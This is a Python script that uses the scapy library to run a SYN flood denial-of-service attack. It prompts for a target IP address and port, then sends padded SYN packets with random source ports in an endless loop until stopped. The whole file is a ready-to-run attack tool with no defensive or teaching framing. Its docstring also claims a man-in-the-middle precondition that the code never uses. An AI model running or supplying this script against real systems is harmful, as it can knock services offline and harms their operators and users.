#!/usr/bin/env python3

import scapy.all as scapy
import sys
import os

"""
    This script performs a SYN flood attack on a target IP address and port.
    The precondition is that the attacker has already established a Man-in-the-Middle position
    
    Arguments:
        target_ip : The IP address of the target to flood.
        target_port: The port to flood.
    """

def syn_flood(target_ip, target_port):
    
    print(f"[*] Starting SYN flood on {target_ip}:{target_port}.")
    
    # Construct the malicious packet
    ip_layer = scapy.IP(dst=target_ip)
    # RandShort() provides a random source port.
    tcp_layer = scapy.TCP(sport=scapy.RandShort(), dport=target_port, flags="S")
    # Adding raw data to increase the packet size
    raw_layer = scapy.Raw(b"X"*1024)
    
    packet = ip_layer / tcp_layer / raw_layer
    
    packets_sent = 0
    try:
        # Sending packets as fast as possible until script is interrupted
        while True:
            scapy.send(packet, verbose=False)
            packets_sent += 1
            print(f"\r[+] Packets sent: {packets_sent}", end="")

    except KeyboardInterrupt:
        print("\n[*] SYN flood stopped.")
        return

if __name__ == "__main__":
    # This script requires root privileges to send raw packets
    if os.geteuid() != 0:
        print("[-] Root privileges missing.")
        sys.exit(1)

    try:
        # Get target information from the user
        target_ip = input("[*] Enter Target IP: ")
        target_port = int(input("[*] Enter Target Port: "))
    except ValueError:
        print("\n[-] Invalid port number.")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n[-] Exit.")
        sys.exit(0)

    # Launch the SYN flood
    syn_flood(target_ip, target_port)
    print("[+] Attack finished.")